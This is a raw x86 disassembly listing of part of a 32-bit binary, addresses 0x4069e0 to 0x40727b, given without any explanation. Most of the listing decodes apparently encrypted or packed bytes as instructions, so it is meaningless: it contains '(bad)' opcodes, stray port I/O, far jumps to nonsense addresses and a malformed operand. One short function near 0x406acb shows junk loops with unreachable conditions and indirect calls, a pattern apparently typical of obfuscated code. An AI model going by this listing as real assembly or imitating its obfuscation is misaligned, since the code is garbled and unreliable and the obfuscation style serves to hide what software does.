  4069e0:	rep lods eax,DWORD PTR ds:[esi]
  4069e2:	int3   
  4069e3:	xchg   DWORD PTR [edx+0x56],esi
  4069e6:	cmp    BYTE PTR [ebx+edx*2-0x65ba9e61],ah
  4069ed:	xchg   esi,eax
  4069ee:	jne    0x406a2d
  4069f0:	iret   
  4069f1:	repnz cmp eax,0x101ec6
  4069f7:	shr    bh,0x8e
  4069fa:	daa    
  4069fb:	cli    
  4069fc:	sub    BYTE PTR cs:[edx+eiz*8-0x547acac2],bl
  406a04:	mov    edi,0x6fa6a505
  406a09:	lock dec edi
  406a0b:	mov    eax,ds:0xabc47250
  406a10:	push   0x22
  406a12:	sbb    ch,BYTE PTR [eax]
  406a14:	or     al,0x8d
  406a16:	jmp    0x4329:0x750552fc
  406a1d:	inc    ebp
  406a1e:	test   BYTE PTR [esi-0x5d654b00],0xa3
  406a25:	ins    BYTE PTR es:[edi],dx
  406a26:	cli    
  406a27:	xchg   edi,eax
  406a28:	fs mov BYTE PTR cs:[edi],cl
  406a2c:	data16 sub BYTE PTR [edi-0x5aaf9043],dl
  406a33:	dec    eax
  406a34:	test   DWORD PTR [ebx],0xf1aed8f1
  406a3a:	loope  0x406a68
  406a3c:	dec    edx
  406a3d:	repnz test DWORD PTR [esi],ebp
  406a40:	adc    BYTE PTR [edx+0x4e4c7ee6],bl
  406a46:	es enter 0xb66a,0x10
  406a4b:	in     al,dx
  406a4c:	es out dx,eax
  406a4e:	cmp    eax,0x43040ad3
  406a53:	out    dx,eax
  406a54:	and    DWORD PTR [esi],eax
  406a56:	repz xchg edx,eax
  406a58:	mov    bh,0x1f
  406a5a:	mov    al,ds:0xd8dcd798
  406a5f:	and    BYTE PTR [ebp-0x5d],dl
  406a62:	dec    ebx
  406a63:	icebp  
  406a64:	sub    al,0x51
  406a66:	js     0x406a37
  406a68:	cmc    
  406a69:	inc    ebx
  406a6a:	adc    ebx,DWORD PTR [edx-0x48]
  406a6d:	mov    al,0x9a
  406a6f:	scas   al,BYTE PTR es:[edi]
  406a70:	fisttp DWORD PTR [edi-0x33]
  406a73:	inc    edx
  406a74:	xor    DWORD PTR ds:0x3e16fbee,edi
  406a7a:	inc    esp
  406a7b:	mov    ebx,esp
  406a7d:	in     al,0x91
  406a7f:	and    bl,al
  406a81:	pusha  
  406a82:	leave  
  406a83:	idiv   DWORD PTR [eax+0x3c536f7c]
  406a89:	or     edx,DWORD PTR [edx]
  406a8b:	xchg   edi,eax
  406a8c:	mov    edx,0xc206043d
  406a91:	out    0x7f,al
  406a93:	cdq    
  406a94:	lods   al,BYTE PTR ds:[esi]
  406a95:	mov    al,ds:0x409489eb
  406a9a:	je     0x406a54
  406a9c:	sub    DWORD PTR ds:0x85eebd6,ecx
  406aa2:	jle    0x406af1
  406aa4:	ret    
  406aa5:	and    al,0x43
  406aa7:	in     eax,0xa5
  406aa9:	fmul   DWORD PTR [eax]
  406aab:	ss clc 
  406aad:	push   esp
  406aae:	cmp    esp,DWORD PTR [eax+0x4]
  406ab1:	and    ecx,DWORD PTR [eax+0x26]
  406ab4:	jmp    DWORD PTR [esi]
  406ab6:	leave  
  406ab7:	stos   DWORD PTR es:[edi],eax
  406ab8:	outs   dx,BYTE PTR ds:[esi]
  406ab9:	xchg   ecx,eax
  406aba:	push   esp
  406abb:	xchg   BYTE PTR [ebx+0x330a3416],al
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xc5
  406c9b:	jp     0x406c5d
  406c9d:	lock pop ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c9c
  406ca7:	dec    esp
  406ca8:	cmc    
  406ca9:	retf   0x1951
  406cac:	jb     0x406ce2
  406cae:	xchg   ebx,eax
  406caf:	pop    ebx
  406cb0:	ins    DWORD PTR es:[edi],dx
  406cb1:	lock outs dx,BYTE PTR ds:[esi]
  406cb3:	call   0x1bfb:0x907c9b
  406cba:	clc    
  406cbb:	jp     0x406c4e
  406cbd:	inc    esi
  406cbe:	aam    0xf7
  406cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cc1:	lods   eax,DWORD PTR ds:[esi]
  406cc2:	mov    cl,0x42
  406cc4:	and    BYTE PTR [eax+0x39822f62],cl
  406cca:	scas   al,BYTE PTR es:[edi]
  406ccb:	sahf   
  406ccc:	aam    0x21
  406cce:	ds inc ecx
  406cd0:	mov    esp,0xb64d461b
  406cd5:	jmp    0xc6ed6fc5
  406cda:	mov    ecx,0x7e8d3a3
  406cdf:	xor    al,BYTE PTR [edi-0x61]
  406ce2:	mov    ebp,0x65fbda3a
  406ce7:	adc    cl,BYTE PTR [edi-0xe]
  406cea:	cmp    eax,0x9ab3014a
  406cef:	mov    ebp,DWORD PTR [edi]
  406cf1:	dec    edx
  406cf2:	repnz inc eax
  406cf4:	popa   
  406cf5:	mov    dh,0xf9
  406cf7:	loop   0x406c9a
  406cf9:	pusha  
  406cfa:	jbe    0x406ccf
  406cfc:	pop    esi
  406cfd:	inc    eax
  406cfe:	pop    ebx
  406cff:	inc    eax
  406d00:	push   es
  406d01:	and    eax,0xf2a121b3
  406d06:	sub    ebx,DWORD PTR [ecx+ebx*4+0x1f194dbd]
  406d0d:	fwait
  406d0e:	cmc    
  406d0f:	pop    ecx
  406d10:	int    0xe2
  406d12:	add    esp,esp
  406d14:	or     ah,cl
  406d16:	sub    dl,BYTE PTR [eax+eiz*1+0x47]
  406d1a:	mov    ah,0xfc
  406d1c:	xor    BYTE PTR [eax],ah
  406d1e:	xor    eax,0xe7126639
  406d23:	call   0xb038:0xf9d7ed32
  406d2a:	mov    edi,0xf83f6910
  406d2f:	jae    0x406d89
  406d31:	out    0x9d,eax
  406d33:	xchg   edx,eax
  406d34:	dec    eax
  406d35:	test   al,0x20
  406d37:	xchg   ebx,eax
  406d38:	popa   
  406d39:	aad    0xbc
  406d3b:	arpl   WORD PTR [esi-0x454f50d5],sp
  406d41:	(bad)  
  406d42:	cmp    al,0x11
  406d44:	pop    edx
  406d45:	mov    ebp,0x5aea350e
  406d4a:	outs   dx,BYTE PTR ds:[esi]
  406d4b:	leave  
  406d4c:	or     eax,0xca75639a
  406d51:	jb     0x406da3
  406d53:	in     eax,dx
  406d54:	xchg   ecx,eax
  406d55:	dec    ebp
  406d56:	mov    al,ds:0x8b36fb58
  406d5b:	fs aas 
  406d5d:	outs   dx,DWORD PTR ds:[esi]
  406d5e:	into   
  406d5f:	inc    BYTE PTR [esi-0x2a]
  406d62:	into   
  406d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d64:	mov    dl,BYTE PTR [eax+0x6876b437]
  406d6a:	jns    0x406deb
  406d6c:	test   al,0x6e
  406d6e:	dec    ebp
  406d6f:	lock and BYTE PTR [edx+eiz*2],0x8
  406d74:	cwde   
  406d75:	ds popf 
  406d77:	mov    dl,0xff
  406d79:	stc    
  406d7a:	mov    eax,ds:0x9b1071e4
  406d7f:	sahf   
  406d80:	push   ecx
  406d81:	lods   eax,DWORD PTR ds:[esi]
  406d82:	mov    dh,0x8e
  406d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d85:	(bad)  
  406d86:	cli    
  406d87:	in     eax,0xc0
  406d89:	dec    ebx
  406d8a:	mov    al,ds:0xb71ed4c
  406d8f:	(bad)  [ebx+0x40b7cc66]
  406d95:	das    
  406d96:	cmp    al,0x3e
  406d98:	das    
  406d99:	jbe    0x406d27
  406d9b:	out    dx,eax
  406d9c:	sbb    esp,edx
  406d9e:	arpl   WORD PTR [ebx],dx
  406da0:	jb     0x406d36
  406da2:	fistp  WORD PTR [edi-0x30]
  406da5:	sub    DWORD PTR [ecx+0x66b19cb6],0x1bd0606d
  406daf:	push   0x4e
  406db1:	pop    ss
  406db2:	popf   
  406db3:	or     DWORD PTR [esi],edx
  406db5:	push   es
  406db6:	imul   ebp,DWORD PTR [eax-0x5a],0x9253df4e
  406dbd:	push   ss
  406dbe:	dec    esp
  406dbf:	push   eax
  406dc0:	cmp    DWORD PTR [edx+0x34e4f395],0x73381d29
  406dca:	xlat   BYTE PTR ds:[ebx]
  406dcb:	sbb    al,0x8d
  406dcd:	cmp    dh,BYTE PTR [eax-0x534475c9]
  406dd3:	outs   dx,BYTE PTR ds:[esi]
  406dd4:	ss jp  0x406d87
  406dd7:	cs int 0x14
  406dda:	adc    bh,ah
  406ddc:	mov    ds:0x398c296c,eax
  406de1:	jge    0x406e61
  406de3:	jb     0x406d90
  406de5:	mov    esi,DWORD PTR [edx]
  406de7:	xchg   edi,eax
  406de8:	aam    0xc3
  406dea:	pcmpeqw mm4,QWORD PTR [esp+edx*4-0x6793e84a]
  406df2:	mov    ds:0x7a9caa61,al
  406df7:	call   0xd0b5:0x6ba4b4b3
  406dfe:	add    esp,ebp
  406e00:	out    0x30,eax
  406e02:	push   ebp
  406e03:	mov    esi,0x79a151c2
  406e08:	xchg   edi,eax
  406e09:	mov    eax,0xac419608
  406e0e:	and    ebx,esp
  406e10:	int    0xdc
  406e12:	push   0x705cef77
  406e17:	and    DWORD PTR ds:0xe0e55ece,edi
  406e1d:	xchg   esi,eax
  406e1e:	pusha  
  406e1f:	cld    
  406e20:	hlt    
  406e21:	cmp    ecx,eax
  406e23:	pop    ds
  406e24:	lahf   
  406e25:	xor    ch,ch
  406e27:	push   ecx
  406e28:	clc    
  406e29:	cld    
  406e2a:	xchg   ecx,eax
  406e2b:	dec    ebx
  406e2c:	add    ch,BYTE PTR [esi-0x2d]
  406e2f:	push   es
  406e30:	rcl    esi,1
  406e32:	adc    ch,cl
  406e34:	cmp    DWORD PTR [edi-0x22],0xa916f0cd
  406e3b:	popa   
  406e3c:	jne    0x406e4b
  406e3e:	add    dh,BYTE PTR [ebx+0x13]
  406e41:	mov    ecx,0xab175551
  406e46:	shr    BYTE PTR [esi-0x20],cl
  406e49:	dec    ebp
  406e4a:	or     eax,0xf67a7ec0
  406e4f:	cmp    BYTE PTR [ebx],bh
  406e51:	lods   eax,DWORD PTR ds:[esi]
  406e52:	xor    BYTE PTR ds:0x2822f793,al
  406e58:	ins    BYTE PTR es:[edi],dx
  406e59:	or     edi,DWORD PTR [edi-0x231e4b67]
  406e5f:	push   0x2a
  406e61:	dec    esp
  406e62:	dec    ebp
  406e63:	outs   dx,DWORD PTR ds:[esi]
  406e64:	mov    ch,0x58
  406e66:	mov    esp,0x2da98141
  406e6b:	push   cs
  406e6c:	xor    esp,ebp
  406e6e:	mov    ?,WORD PTR [eax]
  406e70:	jl     0x406ee5
  406e72:	sbb    eax,DWORD PTR [esi-0x51]
  406e75:	mov    bl,BYTE PTR [edi+ebx*2-0x51]
  406e79:	and    dl,BYTE PTR [eax+0x3794dabe]
  406e7f:	cmp    eax,0x12e12987
  406e84:	test   edx,ebp
  406e86:	dec    ecx
  406e87:	fs (bad) 
  406e89:	in     eax,0xf1
  406e8b:	cmp    eax,0x1ada88a0
  406e90:	jbe    0x406edc
  406e92:	std    
  406e93:	cdq    
  406e94:	pop    ss
  406e95:	ss push ds
  406e97:	lods   eax,DWORD PTR ds:[esi]
  406e98:	xchg   esp,eax
  406e99:	out    0x2d,eax
  406e9b:	je     0x406e3e
  406e9d:	aad    0x7a
  406e9f:	mov    ds:0x77e52c2a,eax
  406ea4:	ja     0x406e67
  406ea6:	xchg   esi,eax
  406ea7:	lods   al,BYTE PTR ds:[esi]
  406ea8:	pop    edi
  406ea9:	movups xmm4,XMMWORD PTR [ebp+0x57]
  406ead:	mov    WORD PTR [edx+0x1e],cs
  406eb0:	test   BYTE PTR [edx+0x40d51fe2],ah
  406eb6:	aas    
  406eb7:	xchg   esi,eax
  406eb8:	retf   
  406eb9:	(bad)  
  406eba:	xchg   edx,eax
  406ebb:	or     BYTE PTR [edx+0x19],bh
  406ebe:	hlt    
  406ebf:	inc    esi
  406ec0:	mov    ds:0x982109ba,eax
  406ec5:	inc    eax
  406ec6:	mov    ss:0xe285a6e6,eax
  406ecc:	inc    edx
  406ecd:	scas   al,BYTE PTR es:[edi]
  406ece:	leave  
  406ecf:	mov    cl,0x4d
  406ed1:	test   DWORD PTR [edx],0x89d6b62f
  406ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ed8:	cmp    ebp,DWORD PTR [ecx+0x0]
  406edb:	gs jmp 0xc87f:0x66771cbd
  406ee3:	push   ds
  406ee4:	scas   al,BYTE PTR es:[edi]
  406ee5:	sbb    eax,0xad4cb72f
  406eea:	xchg   ebp,eax
  406eeb:	add    edx,ebx
  406eed:	sub    eax,0xdcd4447e
  406ef2:	icebp  
  406ef3:	mov    ds:0x300fe2b,eax
  406ef8:	arpl   WORD PTR [esi+0x1f3e892],si
  406efe:	mov    DWORD PTR [edx-0x3f],ecx
  406f01:	and    ah,cl
  406f03:	and    edx,DWORD PTR [ebx+0x33254385]
  406f09:	push   eax
  406f0a:	pop    es
  406f0b:	jge    0x406ea9
  406f0d:	into   
  406f0e:	out    0x2e,al
  406f10:	pushf  
  406f11:	ror    BYTE PTR [eax],cl
  406f13:	dec    edx
  406f14:	inc    edx
  406f15:	xchg   esp,eax
  406f16:	ficom  DWORD PTR [esi+ecx*8+0x6701a76f]
  406f1d:	addr16 sbb al,0xcc
  406f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f21:	sub    DWORD PTR [ebp-0x3a],ebx
  406f24:	cmp    eax,0x1d21a936
  406f29:	add    eax,0xeadd81bb
  406f2e:	ins    DWORD PTR es:[edi],dx
  406f2f:	jle    0x406f75
  406f31:	xor    eax,0x3c0fa340
  406f36:	jp     0x406f8d
  406f38:	cld    
  406f39:	xor    DWORD PTR [edi+0x8],eax
  406f3c:	xchg   esi,eax
  406f3d:	gs dec esp
  406f3f:	imul   eax,DWORD PTR [ecx-0x3838eca8],0xddba50d1
  406f49:	xor    DWORD PTR [esi+0x234c0556],ebp
  406f4f:	mov    ah,BYTE PTR [edx]
  406f51:	sbb    esp,DWORD PTR [ebx]
  406f53:	in     al,0x5f
  406f55:	fist   DWORD PTR [edi-0x11]
  406f58:	jb     0x406fc2
  406f5a:	mov    BYTE PTR [edi-0x31],al
  406f5d:	test   DWORD PTR [ebp+0x48af3344],edx
  406f63:	and    eax,ebp
  406f65:	pop    esi
  406f66:	adc    BYTE PTR [eax+0x1f66a593],bl
  406f6c:	es push edx
  406f6e:	int    0x12
  406f70:	jo     0x406f8d
  406f72:	mov    ebx,0x917343f8
  406f77:	mov    esi,0x5b5dcf12
  406f7c:	push   ebx
  406f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f7e:	int    0xfa
  406f80:	or     ch,bl
  406f82:	lahf   
  406f83:	loop   0x406fb8
  406f85:	lea    esp,[ebp+0xcde46d5]
  406f8b:	scas   al,BYTE PTR es:[edi]
  406f8c:	arpl   WORD PTR [esi+0x3e46107b],si
  406f92:	inc    edx
  406f93:	or     eax,0xd41fa813
  406f98:	int    0x6f
  406f9a:	mul    BYTE PTR [edx-0x200ff73d]
  406fa0:	mov    edx,0x265a9236
  406fa5:	push   esp
  406fa6:	jmp    0xad87c0a0
  406fab:	xor    dh,al
  406fad:	into   
  406fae:	ins    DWORD PTR es:[edi],dx
  406faf:	cdq    
  406fb0:	mov    dl,0x6f
  406fb2:	sub    al,0xa1
  406fb4:	mov    eax,0xda8483dd
  406fb9:	and    ch,ah
  406fbb:	inc    edx
  406fbc:	jl     0x406fd3
  406fbe:	ins    BYTE PTR es:[edi],dx
  406fbf:	pop    eax
  406fc0:	inc    ebx
  406fc1:	jl     0x406faa
  406fc3:	aas    
  406fc4:	mov    bl,0xc4
  406fc6:	jg     0x406fec
  406fc8:	out    0xfb,al
  406fca:	call   0x56a273c6
  406fcf:	nop
  406fd0:	clc    
  406fd1:	retf   
  406fd2:	cmp    eax,0xc7fb2063
  406fd7:	inc    ebp
  406fd8:	int3   
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	jb     0x406fde
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	out    0x42,eax
  406fe6:	add    bh,al
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR ds:0xc741dfd2,cx
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x40700c
  407018:	pop    ebp
  407019:	mov    ebx,0x38481a6a
  40701e:	stos   BYTE PTR es:[edi],al
  40701f:	dec    ecx
  407020:	jno    0x406fe9
  407022:	lahf   
  407023:	and    eax,0xc7e74a5d
  407028:	sbb    al,0xf6
  40702a:	loop   0x40707c
  40702c:	jmp    0x415ed15d
  407031:	icebp  
  407032:	xor    BYTE PTR [edi-0x1],cl
  407035:	ins    BYTE PTR es:[edi],dx
  407036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407037:	(bad)  
  407038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407039:	fcomp  QWORD PTR [edx-0x1d85ad22]
  40703f:	jle    0x406fd3
  407041:	inc    ebp
  407042:	fstp   DWORD PTR [eax-0x69db6fe0]
  407048:	test   BYTE PTR [esi+eax*2],0xca
  40704c:	retf   
  40704d:	adc    ebx,ebx
  40704f:	call   0x92e3:0xe353fabd
  407056:	test   BYTE PTR ds:0xfd18a2fe,0x46
  40705d:	mov    eax,0x4ae65728
  407062:	push   esi
  407063:	mov    edx,0xb0beb1b8
  407068:	cld    
  407069:	mov    ebx,0x120d30d
  40706e:	adc    dh,BYTE PTR [ebp-0x56552aad]
  407074:	stos   DWORD PTR es:[edi],eax
  407075:	dec    BYTE PTR [ebx+0x74dcb1f3]
  40707b:	retf   0x86de
  40707e:	dec    eax
  40707f:	adc    bl,bl
  407081:	inc    esi
  407082:	sub    DWORD PTR [ebx+0x10cbf1a5],0xffffffd8
  407089:	(bad)  
  40708b:	es mov ecx,fs
  40708e:	mov    ebp,0x5ca121b7
  407093:	(bad)  
  407094:	xchg   ecx,eax
  407095:	jle    0x407025
  407097:	int3   
  407098:	push   ecx
  407099:	adc    al,BYTE PTR [ecx+0x79]
  40709c:	and    al,0x88
  40709e:	enter  0x1829,0xa3
  4070a2:	jb     0x4070f7
  4070a4:	sub    esp,DWORD PTR [ebp+0x2df0e98f]
  4070aa:	cmp    BYTE PTR ds:0xb95ac6be,cl
  4070b0:	out    0xb3,al
  4070b2:	cmp    DWORD PTR [eax+ebp*4-0x6a],ebp
  4070b6:	outs   dx,DWORD PTR ds:[esi]
  4070b7:	jg     0x407056
  4070b9:	mov    edx,cs
  4070bb:	jae    0x4070f6
  4070bd:	add    eax,0xc4cdbcf7
  4070c2:	aaa    
  4070c3:	hlt    
  4070c4:	in     al,dx
  4070c5:	test   BYTE PTR ds:0x91b7562d,bl
  4070cb:	xor    ebx,ebx
  4070cd:	cmp    esi,esi
  4070cf:	shl    dh,cl
  4070d1:	jecxz  0x407120
  4070d3:	cli    
  4070d4:	dec    edx
  4070d5:	mov    edx,0xaa1251a4
  4070da:	inc    esi
  4070db:	mov    WORD PTR [esi+0x50ee22cb],es
  4070e1:	sub    ah,BYTE PTR [ebp-0x7c4a043b]
  4070e7:	repnz and eax,0x5b7a53c7
  4070ed:	ret    
  4070ee:	sbb    al,0xb5
  4070f0:	and    al,BYTE PTR [edx-0x44]
  4070f3:	mov    bl,0x8
  4070f5:	hlt    
  4070f6:	push   cs
  4070f7:	push   eax
  4070f8:	or     BYTE PTR [ebp+0x3f96ec62],cl
  4070fe:	mov    al,ds:0x5b1cf66b
  407103:	repz shl BYTE PTR [esi+0x8746cf9],1
  40710a:	popf   
  40710b:	jns    0x4070be
  40710d:	jg     0x40718c
  40710f:	ret    0xa7dd
  407112:	adc    edi,DWORD PTR [esi]
  407114:	mov    edx,0xea83e2e8
  407119:	jne    0x40712c
  40711b:	push   es
  40711c:	bound  ebp,QWORD PTR [ebx+0x61f31f6]
  407122:	or     ebx,edi
  407124:	xchg   DWORD PTR [ebx-0x2ff112a1],esi
  40712a:	pop    es
  40712b:	add    al,0xc4
  40712d:	push   ecx
  40712e:	jbe    0x4071aa
  407130:	stc    
  407131:	repz icebp 
  407133:	jno    0x407157
  407135:	sub    BYTE PTR [edx-0x7c],cl
  407138:	pop    edx
  407139:	push   ebp
  40713a:	sbb    bh,al
  40713c:	mov    ebx,0x10a029e4
  407141:	in     eax,dx
  407142:	outs   dx,DWORD PTR ds:[esi]
  407143:	(bad)  
  407144:	aaa    
  407145:	jno    0x4071a4
  407147:	mov    ebx,0xb93d4c0a
  40714c:	repnz cwde 
  40714e:	fidivr WORD PTR [edi+0x349eec0e]
  407154:	or     edi,DWORD PTR [ecx+ecx*1+0x503f57fb]
  40715b:	lahf   
  40715c:	ds or  al,0x9d
  40715f:	mov    ecx,0x3fce1772
  407164:	pop    ds
  407165:	jb     0x4071d4
  407167:	push   esp
  407168:	xor    DWORD PTR [edi+0x2],edx
  40716b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40716c:	aam    0xad
  40716e:	sbb    BYTE PTR [edi],dh
  407170:	jmp    0x9084e043
  407175:	xlat   BYTE PTR ds:[ebx]
  407176:	cli    
  407177:	sti    
  407178:	es pop ebx
  40717a:	push   esi
  40717b:	addr16 loope 0x40716a
  40717e:	jb     0x40719a
  407180:	mov    dh,0x71
  407182:	jl     0x40716e
  407184:	cmp    ecx,DWORD PTR [edx+0xacecd48]
  40718a:	or     BYTE PTR [edx-0x70],dl
  40718d:	retf   0x3e2d
  407190:	push   eax
  407191:	fsub   DWORD PTR [ebp-0x709aaf34]
  407197:	jge    0x407197
  407199:	es in  al,0x43
  40719c:	sub    DWORD PTR [ebx],edx
  40719e:	mov    BYTE PTR [ebx],dh
  4071a0:	sub    al,0x1f
  4071a2:	and    dh,ch
  4071a4:	jp     0x4071e9
  4071a6:	ins    DWORD PTR es:[edi],dx
  4071a7:	shl    BYTE PTR [edx],0xb9
  4071aa:	xchg   edi,eax
  4071ab:	mov    bh,0x7a
  4071ad:	int    0x19
  4071af:	(bad)  
  4071b0:	jp     0x407143
  4071b2:	je     0x4071f9
  4071b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b5:	loope  0x4071a2
  4071b7:	popf   
  4071b8:	pusha  
  4071b9:	mov    WORD PTR [eax+0xec02724],ss
  4071bf:	rol    BYTE PTR [ebp+esi*2-0x61],cl
  4071c3:	scas   eax,DWORD PTR es:[edi]
  4071c4:	xchg   ebp,edi
  4071c6:	pop    ss
  4071c7:	dec    edi
  4071c8:	imul   ecx,DWORD PTR [edx],0x41
  4071cb:	(bad)  
  4071cc:	mov    ebp,0x67b5be0f
  4071d1:	mov    esi,0x7c0bdb86
  4071d6:	sbb    BYTE PTR [esi-0xc],0x7a
  4071da:	pop    ss
  4071db:	jb     0x40722e
  4071dd:	stos   BYTE PTR es:[edi],al
  4071de:	fwait
  4071df:	push   esi
  4071e0:	out    0xab,eax
  4071e2:	fst    QWORD PTR [edi+eax*4+0x59]
  4071e6:	das    
  4071e7:	sar    BYTE PTR [esi-0x48],0x8a
  4071eb:	push   cs
  4071ec:	repz jae 0x407178
  4071ef:	out    dx,al
  4071f0:	jecxz  0x407204
  4071f2:	jge    0x4071a7
  4071f4:	test   DWORD PTR [edi],ecx
  4071f6:	pop    ds
  4071f7:	aaa    
  4071f8:	cmp    esi,DWORD PTR [ebp+0x4]
  4071fb:	sub    eax,edx
  4071fd:	repnz idiv BYTE PTR [eax-0x26]
  407201:	dec    ebx
  407202:	fst    DWORD PTR [ebp+0x32d99409]
  407208:	ins    DWORD PTR es:[edi],dx
  407209:	push   ds
  40720a:	in     al,dx
  40720b:	ss xor eax,0xa756abfd
  407211:	mov    cl,0xe
  407213:	pop    ss
  407214:	or     DWORD PTR [ebx+0x4720d451],edi
  40721a:	add    al,0x36
  40721c:	enter  0x3b24,0xd8
  407220:	jb     0x407221
  407222:	cmp    eax,0xfedfe955
  407227:	call   0x52e3:0x7005bbe8
  40722e:	(bad)  
  40722f:	pop    esp
  407230:	repz cmp ah,BYTE PTR [edx+0x7]
  407234:	lock or esp,DWORD PTR [edi+0x3]
  407238:	dec    ebx
  407239:	iret   
  40723a:	(bad)  
  40723c:	inc    eax
  40723d:	sub    BYTE PTR [esi+0x6b],al
  407240:	out    0xbb,ax
  407243:	sbb    dh,ah
  407245:	jecxz  0x407222
  407247:	jmp    0x3588:0x467c2f5b
  40724e:	ds or  al,0x36
  407251:	loope  0x4072a9
  407253:	dec    edx
  407254:	fwait
  407255:	cmp    DWORD PTR [ebp-0x27c2d91],ecx
  40725b:	(bad)
  40725e:	sbb    ecx,DWORD PTR [ecx-0x19]
  407261:	les    edx,FWORD PTR [eax+0x111c28ee]
  407267:	xor    esp,DWORD PTR [eax+0x78]
  40726a:	sub    bh,BYTE PTR [esi-0x748385af]
  407270:	and    BYTE PTR [ebp-0x55],bl
  407273:	add    BYTE PTR ds:0x318d3085,0x21
  40727a:	(bad)  
  40727b:	xor    BYTE PTR [edx],ah
